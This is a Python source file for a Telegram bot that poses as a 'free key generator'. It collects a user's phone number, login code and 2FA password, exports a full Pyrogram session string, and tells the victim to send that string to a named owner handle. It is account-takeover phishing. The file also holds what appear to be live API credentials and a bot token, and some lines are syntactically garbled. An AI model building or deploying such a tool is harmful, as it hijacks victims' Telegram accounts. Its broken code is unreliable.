import os
import asyncio
from pyrogram import Client, filters, enums
from pyrogram.types import Message
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)asa

# Import Configuration from config.py
from config import Config

# --- BOT CLIENT INITIALIZATION ---
bot = Client(
    "StringSessionBot",
    api_id=Config.31260540,
    api_hash=Config.cd213befc727364a96df92d26852bd89,
    bot_token=Config.8573583620:AAFlxbvhN1xSXSoU1KBVEZ2zBlomn3ew5ok
)

# In-memory temporary storage for user states
user_states = {}

# --- 1. DIRECT START COMMAND ---
@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    
    # Agar user ka pehle se koi active session process chal raha hai, toh use disconnect karein
    if user_id in user_states:
        old_client = user_states[user_id].get("client")
        if old_client:
            try:
                await old_client.disconnect()
            except Exception:
                pass

    # Reset state and prompt for phone number
    user_states[user_id] = {"step": "AWAITING_PHONE"}

    text = (
        "👑 <b>Welcome To Free Key generator bot</b>\n"
        "🔥 <b>FREE KEY LENE KE LIYE APNA NUMBER OR OTP DALE 👇👇</b>\n\n"
        "📱 <b>Enter Phone Number</b>\n\n"
        "Kripya apna Telegram Phone Number country code ke sath bhejein:\n"
        "<i>Example: <code>+919876543210</code></i>\n\n"
        ""
    )

    await message.reply_text(text, parse_mode=enums.ParseMode.HTML)



# --- 2. CANCEL COMMAND ---
@bot.on_message(filters.command("cancel") & filters.private)
async def cancel_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id in user_states:
        temp_client = user_states[user_id].get("client")
        if temp_client:
            try:
                await temp_client.disconnect()
            except Exception:
                pass
        user_states.pop(user_id, None)
        await message.reply("❌ Process cancel ho gaya. Dobara `/start` karein.")
    else:
        await message.reply("Koi active process nahi hai. `/start` dabayein.")


# --- 3. STEP HANDLER (PHONE -> OTP -> 2FA) ---
@bot.on_message(filters.private & filters.text & ~filters.command(["start", "cancel"]))
async def handle_inputs(client: Client, message: Message):
    user_id = message.from_user.id
    state = user_states.get(user_id)

    if not state:
        return

    step = state.get("step")

    # STEP 1: PHONE NUMBER INPUT
    if step == "AWAITING_PHONE":
        phone_number = message.text.strip().replace(" ", "")
        msg = await message.reply("⏳ OTP request bheja ja raha hai...")

        temp_client = Client(
            name=f"pyro_{user_id}_{asyncio.get_event_loop().time()}",
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            in_memory=True
        )
        
        try:
            await temp_client.connect()
            code_info = await temp_client.send_code(phone_number)
            user_states[user_id] = {
                "step": "AWAITING_OTP",
                "phone": phone_number,
                "client": temp_client,
                "phone_code_hash": code_info.phone_code_hash
            }
        except PhoneNumberInvalid:
            await msg.edit_text("❌ Phone Number galat hai! Country code ke sath sahi number bhejein (e.g. <code>+919876543210</code>).")
            try:
                await temp_client.disconnect()
            except:
                pass
            user_states.pop(user_id, None)
            return
        except Exception as e:
            await msg.edit_text(f"❌ Error: <code>{str(e)}</code>\n\nDobara `/start` karein.")
            try:
                await temp_client.disconnect()
            except:
                pass
            user_states.pop(user_id, None)
            return

        await msg.edit_text(
            "📩 <b>OTP Sent Successfully!</b>\n\n"
            "Telegram app par aaya hua OTP code bhejein.\n\n"
            "⚠️ <b>Note:</b> OTP digits ke beech space dein (e.g. <code>1 2 3 4 5</code>)",
            parse_mode=enums.ParseMode.HTML
        )

    # STEP 2: OTP INPUT
    elif step == "AWAITING_OTP":
        otp_code = message.text.replace(" ", "").strip()
        temp_client = state["client"]
        phone = state["phone"]
        phone_code_hash = state["phone_code_hash"]

        msg = await message.reply("⏳ OTP verify ho raha hai...")

        try:
            await temp_client.sign_in(phone, phone_code_hash, otp_code)
            session_str = await temp_client.export_session_string()
            await temp_client.disconnect()
            user_states.pop(user_id, None)
            await send_session(client, user_id, session_str, msg)
        except SessionPasswordNeeded:
            user_states[user_id]["step"] = "AWAITING_PASSWORD"
            await msg.edit_text(
                "🔐 Account par <b>2FA Password</b> set hai.\n\n"
                "Kripya apna 2FA Password enter karein:",
                parse_mode=enums.ParseMode.HTML
            )
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await msg.edit_text("❌ Galat ya expired OTP! Dobara `/start` karein.")
            try:
                await temp_client.disconnect()
            except:
                pass
            user_states.pop(user_id, None)
        except Exception as e:
            await msg.edit_text(f"❌ Error: <code>{str(e)}</code>")
            try:
                await temp_client.disconnect()
            except:
                pass
            user_states.pop(user_id, None)

    # STEP 3: 2FA PASSWORD INPUT
    elif step == "AWAITING_PASSWORD":
        password = message.text.strip()
        temp_client = state["client"]

        msg = await message.reply("⏳ Password check ho raha hai...")

        try:
            await temp_client.check_password(password)
            session_str = await temp_client.export_session_string()
            await temp_client.disconnect()
            user_states.pop(user_id, None)
            await send_session(client, user_id, session_str, msg)
        except PasswordHashInvalid:
            await msg.edit_text("❌ Galat 2FA Password! Dobara sahi password enter karein:")
        except Exception as e:
            await msg.edit_text(f"❌ Error: <code>{str(e)}</code>")
            try:
                await temp_client.disconnect()
            except:
                pass
            user_states.pop(user_id, None)


# --- 4. SESSION STRING DELIVERY ---
async def send_session(bot_client: Client, user_id: int, session_str: str, status_msg: Message):
    try:
        await status_msg.delete()
    except Exception:
        pass

    text = (
        "🎉 <b>Pyrogram Your Key Generated!</b>\n\n"
        f"<code>{session_str}</code>\n\n"
        "🔒 <b>Key Update :</b> ISE COPY KRKE OWNER KO SEND KRE  @Simple_Boy_1k "
    )
    await bot_client.send_message(user_id, text, parse_mode=enums.ParseMode.HTML)


# --- MAIN ENTRY POINT ---
if __name__ == "__main__":
    print("🚀 Sarkar String Session Generator Bot Started!")
    bot.run()
